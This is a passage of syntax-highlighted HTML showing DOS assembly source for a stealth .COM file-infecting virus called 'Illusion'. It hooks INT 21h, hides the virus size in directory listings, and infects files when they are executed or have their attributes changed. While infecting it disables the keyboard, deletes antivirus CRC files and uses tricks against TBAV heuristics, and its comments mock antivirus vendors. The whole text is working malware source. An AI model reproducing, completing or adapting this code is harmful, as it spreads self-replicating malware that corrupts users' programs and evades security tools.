           </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">pushf</span><span class="sc0">                              
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldInt21h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Call to INT 21h</span><span class="sc0">
           </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                            </span><span class="sc1">;Error ?</span><span class="sc0">
           </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">fcb_out</span><span class="sc0">                          </span><span class="sc1">;Jmp if error</span><span class="sc0">
        
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">;Save registers</span><span class="sc0">
        
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">                           </span><span class="sc1">;Get current psp</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                             

           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                            </span><span class="sc1">;Es=segment of psp</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;psp of COMMAND.COM?</span><span class="sc0">
           </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">fcb_out1</span><span class="sc0">                         </span><span class="sc1">;no, then jmp</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                            </span><span class="sc1">;DS:BX=FCB</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;1st byte of fcb</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">;save it</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">                           </span><span class="sc1">;get DTA in ES:BX</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                           

           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">;get first byte</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                               </span><span class="sc1">;al=ffh therefor al=ZR</span><span class="sc0">
           </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">fcb_old</span><span class="sc0">                          </span><span class="sc1">;if != ZR jmp</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">                            </span><span class="sc1">;extended fcb here, +7</span><span class="sc0">

</span><span class="sc5">fcb_old</span><span class="sc4">:</span><span class="sc0">       
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">09h</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0">        </span><span class="sc1">;It`s a .COM file ?</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Fcb_out1</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;Get file time stamp</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">19h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;Get file date stamp</span><span class="sc0">
           </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">                           </span><span class="sc1">;Unmask seconds field</span><span class="sc0">
           </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">                           </span><span class="sc1">;Unmask day of month</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                            </span><span class="sc1">;Are they equal?</span><span class="sc0">
           </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">fcb_out1</span><span class="sc0">                         </span><span class="sc1">;Nope, exit ...  </span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],</span><span class="sc5">Illusion_Size</span><span class="sc0"> </span><span class="sc1">;sub away virus_size</span><span class="sc0">
           </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1fh</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Sub with carry flag</span><span class="sc0">

</span><span class="sc5">fcb_out1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;Restore registers</span><span class="sc0">

</span><span class="sc5">fcb_out</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">iret</span><span class="sc0">                                     </span><span class="sc1">;Return control</span><span class="sc0">


</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                            NEW INTERRUPT 21h                               *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">Int21_Illusion</span><span class="sc4">:</span><span class="sc0">     
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3066h</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Int21_Check</span><span class="sc0">
           
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0555h</span><span class="sc0">                         </span><span class="sc1">;Return AX=555 !!!</span><span class="sc0">
           </span><span class="sc6">iret</span><span class="sc0">                                              
           
</span><span class="sc5">Int21_Check</span><span class="sc4">:</span><span class="sc0">   
           </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                            </span><span class="sc1">;Anti-heuristics(TBAV)</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Fcb_Stealth</span><span class="sc0">                      </span><span class="sc1">;FCB Stealth</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Fcb_stealth</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">HANDLE_stealth</span><span class="sc0">                   </span><span class="sc1">;HANDLE Stealth</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">                          
           </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">HANDLE_stealth</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">                         </span><span class="sc1">;Execute </span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Infectar</span><span class="sc0">                           
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">                           </span><span class="sc1">;Chmod</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Infectar</span><span class="sc0">
           </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                            </span><span class="sc1">;Restore this</span><span class="sc0">

</span><span class="sc5">ExitInt21</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0eah</span><span class="sc0">                                </span><span class="sc1">;Exit ...</span><span class="sc0">
</span><span class="sc5">Oldint21h</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">                                 </span><span class="sc1">;Old Int 21h</span><span class="sc0">

</span><span class="sc5">ExitTun21</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0eah</span><span class="sc0">                              
</span><span class="sc5">Tunnel21h</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">                                 </span><span class="sc1">;Tunneled Int 21h</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                             HANDLE STEALTH                                 *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">HANDLE_Stealth</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">xchg</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">pushf</span><span class="sc0">                             
           </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldInt21h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;Call to INT 21h</span><span class="sc0">
           </span><span class="sc6">jnc</span><span class="sc0">   </span><span class="sc5">Handle_OK</span><span class="sc0">

           </span><span class="sc6">stc</span><span class="sc0">
           </span><span class="sc6">retf</span><span class="sc0">  </span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">Handle_OK</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">;Save registers</span><span class="sc0">
        
           </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">                                
           </span><span class="sc6">pushf</span><span class="sc0">                             
           </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldInt21h</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;Call to INT 21h</span><span class="sc0">
        
           </span><span class="sc6">dec</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0008h</span><span class="sc4">]</span><span class="sc0">
           
           </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"-F"</span><span class="sc0">                             </span><span class="sc1">;F-PROT (Fuck POTATOE)</span><span class="sc0">
           </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">not_infected</span><span class="sc0">
        
           </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"RA"</span><span class="sc0">                             </span><span class="sc1">;ARJ</span><span class="sc0">
           </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">not_infected</span><span class="sc0">
        
           </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"AR"</span><span class="sc0">                             </span><span class="sc1">;RAR</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">not_infected</span><span class="sc0">
        
           </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"KP"</span><span class="sc0">                             </span><span class="sc1">;PK*</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">not_infected</span><span class="sc0">
        
           </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">                              </span><span class="sc1">;get DTA</span><span class="sc0">
           </span><span class="sc6">pushf</span><span class="sc0">                             
           </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldInt21h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;Call to INT 21h</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;Get file time stamp</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;Get file date stamp</span><span class="sc0">
           </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">                              </span><span class="sc1">;Unmask seconds field</span><span class="sc0">
           </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">                              </span><span class="sc1">;Unmask day of month</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                               </span><span class="sc1">;Are they equal</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">not_infected</span><span class="sc0">   

           </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">
           </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">Hnd_Sub</span><span class="sc0">
        
           </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc2">0E0h</span><span class="sc0">           </span><span class="sc1">;Erase erroneous sec.</span><span class="sc0">
        
</span><span class="sc5">HnD_Sub</span><span class="sc4">:</span><span class="sc0">        
           </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc5">Illusion_size</span><span class="sc0">  </span><span class="sc1">;Sub virus size</span><span class="sc0">
           </span><span class="sc6">sbb</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;Sub with carry flag</span><span class="sc0">
        
</span><span class="sc5">not_infected</span><span class="sc4">:</span><span class="sc0">    
           </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">clc</span><span class="sc0">
           </span><span class="sc6">retf</span><span class="sc0">  </span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                         RUTINE TO INFECT                                   *</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">Infectar</span><span class="sc4">:</span><span class="sc0">     
           </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
           
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;Save this Shit ;-)</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Disable_KB</span><span class="sc0">                       </span><span class="sc1">;Turn off Keyboard</span><span class="sc0">

</span><span class="sc5">Check_File</span><span class="sc4">:</span><span class="sc0">    
           </span><span class="sc6">cld</span><span class="sc0">                                      </span><span class="sc1">;Check extension</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                            </span><span class="sc1">;for COM</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                  
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">                           </span><span class="sc1">;Search extension</span><span class="sc0">
           </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">                          
</span><span class="sc5">Check_COM</span><span class="sc4">:</span><span class="sc0">                                  
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0">            </span><span class="sc1">;Check 'CO'</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">No_GOOD</span><span class="sc0">                          </span><span class="sc1">;and</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">           </span><span class="sc1">;Check 'M'</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">No_GOOD</span><span class="sc0">                       


</span><span class="sc5">Check_COMMAND</span><span class="sc4">:</span><span class="sc0">                        
           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'NA'</span><span class="sc0">          </span><span class="sc1">;COMMAND.COM ?</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Continue</span><span class="sc0"> 

</span><span class="sc5">No_GOOD</span><span class="sc4">:</span><span class="sc0">       
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Delete_CRC</span><span class="sc0">                       </span><span class="sc1">;Delete CRC files !!</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">restore</span><span class="sc0">                          </span><span class="sc1">;No .COM or COMMAND.COM</span><span class="sc0">

         
</span><span class="sc5">Continue</span><span class="sc4">:</span><span class="sc0">      
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_Int_24h</span><span class="sc0">                      </span><span class="sc1">;Set New Int 24h</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                         </span><span class="sc1">;Get file Attribs             </span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Call_Tun21h</span><span class="sc0">
           
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                               </span><span class="sc1">;Save it </span><span class="sc0">

           </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">                            </span><span class="sc1">;Make sure there normal       </span><span class="sc0">
           </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">open_file</span><span class="sc0">                        </span><span class="sc1">;Okay there are               </span><span class="sc0">
           </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">                          </span><span class="sc1">;Nope, Fix them...            </span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                         </span><span class="sc1">;Save them now                </span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">;AX=4301h (TBAV :-P )</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Call_Tun21h</span><span class="sc0">
           </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">No_GOOD</span><span class="sc0">
                                       
</span><span class="sc5">Open_file</span><span class="sc4">:</span><span class="sc0">   
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">                         </span><span class="sc1">;Open file                      </span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Call_Tun21h</span><span class="sc0">
                                       
           </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">No_GOOD</span><span class="sc0">
           
</span><span class="sc5">Check_Infect</span><span class="sc4">:</span><span class="sc0">  
           </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                            </span><span class="sc1">;BX File handler              </span><span class="sc0">
           
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
          
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                         </span><span class="sc1">;Get file TIME + DATE         </span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Call_Tun21h</span><span class="sc0">
           
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_time</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">;Save file time</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_date</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">        </span><span class="sc1">;Save file date</span><span class="sc0">
                            
           </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">                           </span><span class="sc1">;Unmask second field</span><span class="sc0">
           </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">                           </span><span class="sc1">;Unmask date field</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                            </span><span class="sc1">;are they equal?</span><span class="sc0">
           </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Exit_Close</span><span class="sc0">                       </span><span class="sc1">;File infected</span><span class="sc0">


</span><span class="sc5">exec_time_ok</span><span class="sc4">:</span><span class="sc0">   
           </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_time</span><span class="sc4">],</span><span class="sc2">0ffe0h</span><span class="sc0">    </span><span class="sc1">;Reset second bits</span><span class="sc0">
           </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_time</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">        </span><span class="sc1">;Seconds=day of month</span><span class="sc0">
         
           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                                                    
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                                                    
         
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer_COM</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Read first 3 bytes</span><span class="sc0">
           </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Call_Tun21h</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                           </span><span class="sc1">;Lseek to end</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Move_pointer</span><span class="sc0">

           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer_COM</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Exit_Close</span><span class="sc0"> 

           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer_COM</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">   </span><span class="sc1">;Is file an EXE?  </span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Exit_Close</span><span class="sc0">                       </span><span class="sc1">;Exit !</span><span class="sc0">
           
